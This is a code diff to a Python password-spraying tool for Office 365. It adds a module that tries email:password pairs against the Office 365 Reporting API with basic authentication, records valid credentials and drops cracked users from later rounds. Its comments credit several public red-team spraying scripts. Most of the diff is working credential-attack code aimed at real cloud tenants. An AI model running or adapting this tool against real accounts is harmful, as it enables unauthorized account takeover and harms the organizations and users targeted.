@@ -1,10 +1,14 @@
 #!/usr/bin/env python3
 
-# Based on: https://bitbucket.org/grimhacker/office365userenum/
-#           https://github.com/Raikia/UhOh365
-#           https://github.com/dafthack/MSOLSpray
-#           '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
-#           https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
+"""
+Based on: https://bitbucket.org/grimhacker/office365userenum/
+          https://github.com/Raikia/UhOh365
+          https://github.com/dafthack/MSOLSpray
+          '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
+          https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
+          https://danielchronlund.com/2020/03/17/azure-ad-password-spray-attacks-with-powershell-and-how-to-defend-your-tenant/
+          '-> https://github.com/xFreed0m/ADFSpray
+"""
 
 # TODO: Test and validate each active module
 
@@ -87,6 +91,7 @@ class Sprayer(BaseHandler):
         self._modules = {
             "autodiscover": self._autodiscover,
             "activesync": self._activesync,
+            "reporting": self._reporting,
             "msol": self._msol,
             "adfs": self._adfs,
         }
@@ -518,6 +523,69 @@ class Sprayer(BaseHandler):
             status = response.status_code
 
             if status == 302:
+                if self.writer:
+                    self.valid_writer.write(tested)
+                self.VALID_CREDENTIALS.append(tested)
+                logging.info(
+                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
+                )
+                # Remove valid user from being sprayed again
+                self.userlist.remove(user)
+
+            else:
+                print(
+                    f"[{text_colors.red}INVALID{text_colors.reset}] "
+                    f"{email}:{password}{' '*10}",
+                    end="\r",
+                )
+
+        except Exception as e:
+            logging.debug(e)
+            pass
+
+    # ================================
+    # == -- Reporting API MODULE -- ==
+    # ================================
+
+    def _reporting(self, domain: str, user: str, password: str):
+        """Spray users via the Office 365 Reporting API
+        https://github.com/xFreed0m/ADFSpray
+        https://danielchronlund.com/2020/03/17/azure-ad-password-spray-attacks-with-powershell-and-how-to-defend-your-tenant/
+
+        Arguments:
+            domain: domain to spray
+            user: username for authentication
+            password: password for authentication
+
+        Raises:
+            Exception: generic handler so we can successfully fail without
+              crashing the run
+        """
+        try:
+            # Build email if not already built
+            email = self.helper.check_email(user, domain)
+
+            # Write the tested user
+            tested = f"{email}:{password}"
+            if self.writer:
+                self.tested_writer.write(tested)
+
+            time.sleep(0.250)
+
+            auth = HTTPBasicAuth(email, password)
+            url = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"
+            response = self._send_request(
+                "get",
+                url,
+                auth=auth,
+                proxies=self.proxies,
+                timeout=self.timeout,
+                sleep=self.sleep,
+                jitter=self.jitter,
+            )
+            status = response.status_code
+
+            if status == 200:
                 if self.writer:
                     self.valid_writer.write(tested)
                 self.VALID_CREDENTIALS.append(tested)
